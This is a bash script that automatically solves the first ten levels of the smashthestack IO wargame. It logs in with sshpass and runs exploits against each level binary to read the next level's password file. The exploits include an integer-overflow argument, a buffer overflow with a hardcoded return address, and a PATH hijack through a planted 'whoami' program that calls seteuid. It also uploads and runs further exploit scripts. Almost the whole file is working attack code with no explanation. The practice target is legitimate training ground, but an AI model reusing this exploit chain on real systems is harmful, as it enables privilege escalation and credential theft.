#!/bin/bash
tmpdir="/tmp/sifhwe9ufge9uwgf23yeyi7gf2iuew"
echo -n "level 2: "
offset=`sshpass -p level1 ssh level1@io.smashthestack.org "objdump -d /levels/level01 |grep cmp |cut -d 'x' -f2 |cut -d ',' -f1" 2>/dev/null |tail -n1`
value=`ruby -e "print \"$offset\".to_i(16)"`
level2=`sshpass -p level1 ssh level1@io.smashthestack.org "(echo "$value" && sleep 1 && echo "cat /home/level2/.pass" && exit && cat) | /levels/level01" 2>/dev/null |tail -n1`
echo "$level2"
echo -n "level 3: "
level3=`sshpass -p "$level2" ssh level2@io.smashthestack.org "(echo "cat /home/level3/.pass" && exit && cat) | /levels/level02 -22222222222 -1" 2>/dev/null |head -n1`
echo "$level3"
echo -n "level 4: "
level4=`sshpass -p "$level3" ssh level3@io.smashthestack.org "(echo "cat /home/level4/.pass" && exit && cat) | /levels/level03 \`ruby -e 'print (\"A\" * 76) + \"\x74\x84\x04\x08\"'\`" 2>/dev/null |tail -n1`
echo "$level4"
echo -n "level 5: "
level5=`sshpass -p "$level4" ssh level4@io.smashthestack.org "mkdir $tmpdir;cd $tmpdir;echo '#include <stdio.h>' > whoami.c;echo 'int main() { FILE *fp; seteuid(1005); system(\"cat /home/level5/.pass\"); }' >> whoami.c; gcc -o whoami whoami.c;export PATH=.:\$PATH;/levels/level04;cd ../;rm -rf $tmpdir" 2>/dev/null |cut -d ' ' -f2`
echo "$level5"
echo -n "level 6: "
sshpass -p "$level5" ssh level5@io.smashthestack.org "mkdir $tmpdir" 2>/dev/null
sshpass -p "$level5" scp exploits/level5.sh level5@io.smashthestack.org:$tmpdir/level5.sh 2>/dev/null
level6=`sshpass -p "$level5" ssh level5@io.smashthestack.org "cd $tmpdir;chmod 755 level5.sh; (echo \"cat /home/level6/.pass\" && exit && cat) | ./level5.sh; cd ../;rm -rf $tmpdir" 2>/dev/null`
echo "$level6"
echo -n "level 7: "
sshpass -p "$level6" ssh level6@io.smashthestack.org "mkdir $tmpdir" 2>/dev/null
sshpass -p "$level6" scp exploits/level6.sh level6@io.smashthestack.org:$tmpdir/level6.sh 2>/dev/null
level7=`sshpass -p "$level6" ssh level6@io.smashthestack.org "cd $tmpdir;chmod 755 level6.sh; (echo \"cat /home/level7/.pass\" && exit && cat) | ./level6.sh; cd ../;rm -rf $tmpdir" 2>/dev/null`
echo "$level7"
echo -n "level 8: "
sshpass -p "$level7" ssh level7@io.smashthestack.org "mkdir $tmpdir" 2>/dev/null
sshpass -p "$level7" scp exploits/level7.sh level7@io.smashthestack.org:$tmpdir/level7.sh 2>/dev/null
level8=`sshpass -p "$level7" ssh level7@io.smashthestack.org "cd $tmpdir;chmod 755 level7.sh; (echo \"cat /home/level8/.pass\" && exit && cat) | ./level7.sh; cd ../;rm -rf $tmpdir" 2>/dev/null`
echo "$level8"
echo -n "level 9: "
sshpass -p "$level8" ssh level8@io.smashthestack.org "mkdir $tmpdir" 2>/dev/null
sshpass -p "$level8" scp exploits/level8.c level8@io.smashthestack.org:$tmpdir/level8.c 2>/dev/null
level9=`sshpass -p "$level8" ssh level8@io.smashthestack.org "cd $tmpdir;gcc -o level8 level8.c; (echo \"cat /home/level9/.pass\" && exit && cat) | ./level8; cd ../;rm -rf $tmpdir" 2>/dev/null`
echo "$level9"
echo -n "level 10: "
sshpass -p "$level9" ssh level9@io.smashthestack.org "mkdir $tmpdir" 2>/dev/null
sshpass -p "$level9" scp exploits/level9.sh level9@io.smashthestack.org:$tmpdir/level9.sh 2>/dev/null
level10=`sshpass -p "$level9" ssh level9@io.smashthestack.org "cd $tmpdir;chmod 755 level9.sh; (echo \"echo; cat /home/level10/.pass\" && exit && cat) | ./level9.sh; cd ../;rm -rf $tmpdir" 2>/dev/null |tail -n1`
echo "$level10"
